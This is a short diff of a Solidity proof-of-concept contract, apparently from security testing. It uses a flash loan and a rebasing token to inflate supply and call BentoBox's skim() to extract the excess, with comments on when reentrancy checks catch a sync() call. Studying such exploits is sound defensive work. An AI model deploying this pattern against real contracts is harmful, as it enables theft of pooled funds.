@@ -14,17 +14,18 @@ contract FlashLoanRebaseSkimmer is IFlashLoaner{
     function executeOperation(IERC20 token, uint amount, uint fee, bytes calldata) public override {
         address bentoBox = address(msg.sender);
         uint payback = amount.add(fee);
+        BentoBox bb = BentoBox(bentoBox);
 
-
-        // increase rebase
+        // double supply
         uint256 supply = token.totalSupply();
         RebaseToken rt = RebaseToken(address(token));
         rt.rebase(int256(supply));
+        // if sync() is called by the rebase, then reentrancy is caught
+        // bb.sync(token);
+
         // call skim
-        BentoBox bb = BentoBox(bentoBox);
         bb.skim(token);
-        // if this is called by the token, reentrancy is caught
-        // bb.sync();
+        
         // pay out 
         uint money = token.balanceOf(address(this));
         token.approve(address(bentoBox), payback);
